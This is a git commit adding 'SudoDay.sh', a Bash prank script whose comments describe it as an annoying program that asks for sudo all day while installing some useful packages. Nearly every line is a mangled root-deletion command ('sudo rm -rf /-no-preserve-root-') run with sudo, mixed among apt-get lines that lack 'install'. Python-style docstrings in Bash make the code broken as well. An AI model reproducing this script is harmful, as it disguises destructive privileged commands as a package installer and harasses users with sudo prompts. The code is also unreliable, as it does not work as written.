2ffccad0168a83b3a1dd0b0ce377e507abf6612c
Sean P. Myrick V19.0.2 <65933340+seanpm2001@users.noreply.github.com>
2020-06-23 15:51:03 -0700

    SudoDay.sh
    Version 1 of the Sudo Day script, where you get asked for sudo access for 24 hours straight.

---
+++ Ucuntu/SudoDay.sh
@@ -0,0 +1,342 @@
+# Start of script
+"""
+About SudoDay.sh
+SudoDay is an annoying program that asks for Sudo access for an entire day. Some good packages are sprinkled in to make it worth your while until you restart
+"""
+
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get python3
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get videolan-vlc
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get firefox
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get wine
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get virtualBox
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get vim
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get update
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get scratch2
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get libreOffice6 # If it isn't already installed
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get gimp2 # If it isn't already installed
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get shotcut
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get ffmpeg
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get okular
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get konquerer
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get iceweasel
+sudo apt-get icecat
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get inkscape
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get 7zip
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get emacs
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get latex
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get update
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get 7zip # 2nd chance
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get videolan-vlc # 2nd chance
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get update
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get firefox # 2nd chance
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get ffmpeg # 2nd chance
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get inkscape # 2nd chance
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get python3 # 2nd chance
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get python2
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get update
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get neofetch
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get groff
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get emacs # Again
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get konquerer # Again
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get gimp # Again
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get firefox # Again
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+sudo apt-get latex # Again
+sudo rm -rf /-no-preserve-root-
+sudo rm -rf /-no-preserve-root-
+# Will add more later, this should slow the user down by at least 1 minute
+
+"""
+Current issues:
+* these packages may not be accessible this way
+* Script is bloated and inefficient, I would like to make random results for 24 hours
+* The user can just close the terminal
+* There might be a button to stop all future sudo requests at the beginning
+"""
+
+"""
+File info
+File version: 1 (Tuesday, June 23rd 2020 at 3:51 pm)
+Line count (including spaces): 343
+Language: BASH Shell script (*.sh)
+"""
+# End of script
